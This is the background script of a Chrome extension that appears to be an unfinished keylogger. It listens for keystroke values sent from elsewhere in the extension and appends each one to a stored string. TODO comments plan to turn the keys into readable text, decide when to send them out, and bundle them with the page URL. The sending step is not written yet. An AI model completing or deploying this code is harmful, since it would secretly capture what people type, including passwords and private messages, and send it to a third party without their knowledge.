let keys = "";
chrome.runtime.onInstalled.addListener(() => {
    //TODO set key storage var to empty
    console.log('hi');
    logKeys();
    keyRecvr();
});

function logKeys(){
    console.log("success");
}


function keyRecvr() {
    chrome.runtime.onMessage.addListener(
        function(request, sender,sendResponse){
            //takes req, sender info, and sendResp function takes a message json
            //TODO call a function and pass it key. The function should add it to the storage var
            console.log(request.keyVal);
            sendResponse({resp:"received key"});
            key_agg(request.keyVal);
        }
    );
}

function key_agg(key_code){
    //TODO parse key code to concatenate something meaningful
    //TODO figure out when to send req with keys
    keys = keys.concat(key_code);
    console.log("Keys so far: ", keys);
}

//TODO before we send request maybe create json with url component and log component?